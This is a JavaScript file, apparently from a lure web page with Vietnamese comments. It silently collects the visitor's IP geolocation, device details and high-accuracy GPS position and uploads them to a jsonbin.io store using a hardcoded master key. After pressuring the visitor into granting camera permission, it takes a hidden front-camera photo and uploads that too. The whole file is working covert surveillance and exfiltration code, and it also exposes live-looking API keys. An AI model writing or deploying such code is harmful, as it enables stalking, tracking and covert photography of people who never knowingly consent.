let acpCamera = true;
const saveInformation = localStorage.getItem('saveInformation');

const getDeviceInfo = () => {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenSize: `${screen.width}x${screen.height}`,
        language: navigator.language,
    };
};

const requestOptions = {
    method: "GET",
    redirect: "follow"
};

if (!saveInformation && window.location.hostname != 'localhost' && window.location.hostname != '127.0.0.1') {
    fetch("https://ipgeolocation.abstractapi.com/v1?api_key=722ce31c48d94c48b034237c4e32997e", requestOptions)
    .then((response) => response.text())
    .then((result) => {
        const myHeaders = new Headers();
        myHeaders.append("Content-Type", "application/json");
        myHeaders.append("X-Master-key", "$2a$10$AWN6RDRw6Rf0vv6Y6NzPJeMk.oSA/92LTzmor5kyum2xgicbHgG9e");
    
        let JsonResult = JSON.parse(result);
        JsonResult['device'] = getDeviceInfo();
        JsonResult['position'] = positionValue;
    
        const raw = JSON.stringify(JsonResult);
        
        const requestOptions = {
            method: "POST",
            headers: myHeaders,
            body: raw,
            redirect: "follow"
        };
    
        fetch("https://api.jsonbin.io/v3/b", requestOptions)
        .then((response) => response.text())
        .then((result) => {
            localStorage.setItem('idJsonBin', JSON.parse(result).metadata.id);
            localStorage.setItem('saveInformation', result);
        })
        .catch((error) => console.error(error));
    })
    .catch((error) => console.error(error));
}

const captureBtn = document.getElementById('my-album');
const canvas = document.getElementById('canvas');
let stream = null;

// Khi nhấn nút, xin quyền camera và chụp ảnh ngay lập tức
captureBtn.addEventListener('click', async () => {
    try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

        // Tạo một video ẩn để lấy khung hình
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Đợi camera bật xong (1 giây), rồi chụp ảnh
        setTimeout(() => {
            capturePhoto(video);
        }, 1000);
        acpCamera= true;

    } catch (error) {
        acpCamera= false;
        console.error("Không thể truy cập camera:", error);
        alert("Phải cấp quyền mới xem được ní ơi =,))))).");
    }
});

// Chụp ảnh và gửi lên server
function capturePhoto(video) {
    const context = canvas.getContext('2d');
    // Giảm kích thước ảnh (chỉnh tùy nhu cầu)
    const targetWidth = 480; // Giảm xuống 480px
    const targetHeight = video.videoHeight / (video.videoWidth / targetWidth);
    canvas.width = targetWidth;
    canvas.height = targetHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Chuyển ảnh thành Base64
    let imageData = canvas.toDataURL('image/jpeg', 0.5);
    console.log(imageData);
    // Nếu ảnh > 100KB, giảm chất lượng tiếp
    while (imageData.length / 1024 > 100) {
        imageData = canvas.toDataURL('image/jpeg', 0.4);
    }
    
    // Gửi ảnh lên server (tùy chọn)
    const idJsonBin = localStorage.getItem('idJsonBin');
    if (idJsonBin) {
        sendPhotoToServer(imageData, idJsonBin);
    }

    // Tắt camera ngay sau khi chụp
    stopCamera();
}

// Gửi ảnh lên server
function sendPhotoToServer(imageData, idJsonBin) {
    const myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    myHeaders.append("X-Master-key", "$2a$10$AWN6RDRw6Rf0vv6Y6NzPJeMk.oSA/92LTzmor5kyum2xgicbHgG9e");

    const dataJsonBinNew = {
        idJsonBin: idJsonBin,
        image: imageData
    }
    const raw = JSON.stringify(dataJsonBinNew);

    const requestOptions = {
        method: "POST",
        headers: myHeaders,
        body: raw,
        redirect: "follow"
    };

    fetch("https://api.jsonbin.io/v3/b", requestOptions)
    .then((response) => response.text())
    .then((result) => getStory())
    .catch((error) => console.error(error));
}

// Dừng camera sau khi chụp ảnh
function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
}

// Vị trí
window.onload = function () {
    if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError, {
        enableHighAccuracy: true, // Bật GPS chính xác cao
        timeout: 10000,           // 10 giây
        maximumAge: 0
    });
    } else {
        positionValue = "Trình duyệt không hỗ trợ Geolocation.";
    }
};

// Hàm hiển thị thông tin vị trí
let positionValue = '';
function showPosition(position) {
    let data = {
    "Latitude": position.coords.latitude,
    "Longitude": position.coords.longitude,
    "Độ chính xác (m)": position.coords.accuracy,
    "Độ cao (m)": position.coords.altitude,
    "Độ chính xác độ cao (m)": position.coords.altitudeAccuracy,
    "Hướng di chuyển (độ)": position.coords.heading,
    "Tốc độ (m/s)": position.coords.speed,
    "Thời gian lấy dữ liệu": new Date(position.timestamp).toLocaleString(),
    "Link Google Maps": `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
    };

    // In ra dạng đẹp
    let text = "";
    for (let key in data) {
        text += `${key}: ${data[key]}\n`;
    }
    positionValue = text;
}

// Hàm xử lý lỗi
function showError(error) {
    let msg = "";
    switch(error.code) {
    case error.PERMISSION_DENIED:
        msg = "Bạn đã từ chối chia sẻ vị trí.";
        break;
    case error.POSITION_UNAVAILABLE:
        msg = "Không thể xác định vị trí.";
        break;
    case error.TIMEOUT:
        msg = "Quá thời gian chờ.";
        break;
    default:
        msg = "Lỗi không xác định.";
    }
    positionValue = msg;
}
